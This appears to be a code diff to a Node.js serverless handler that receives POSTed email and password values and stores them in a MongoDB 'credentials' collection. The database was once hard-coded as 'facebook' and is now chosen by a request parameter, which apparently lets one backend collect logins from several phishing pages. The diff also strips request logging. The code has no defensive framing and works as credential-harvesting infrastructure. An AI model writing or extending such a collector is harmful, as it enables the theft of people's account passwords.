@@ -1,4 +1,3 @@
-const url = require('url');
 const { parse } = require('querystring');
 
 const MongoClient = require('mongodb').MongoClient;
@@ -26,22 +25,17 @@ function collectRequestData(request, callback) {
 
 module.exports = (req, res) => {		
 
-  var params = url.parse(req.url, true).query;
-
   if(req.method === 'POST'){
 	
 	collectRequestData(req, (params) => {
 
-		console.log(req.headers);
-		console.log(params);
-
-		if(params != null && params.email && params.password){
+		if(params != null && params.database && params.email && params.password){
 
 			const client = new MongoClient(process.env.MONGO_URI, { useNewUrlParser: true });
 			
 			client.connect(err => {
 			  
-				const collection = client.db("facebook").collection("credentials");
+				const collection = client.db(params.database).collection("credentials");
 
 				collection.insertOne({'datetime': new Date(), 'email': params.email, 'password': params.password}, (err, result) => {
 				
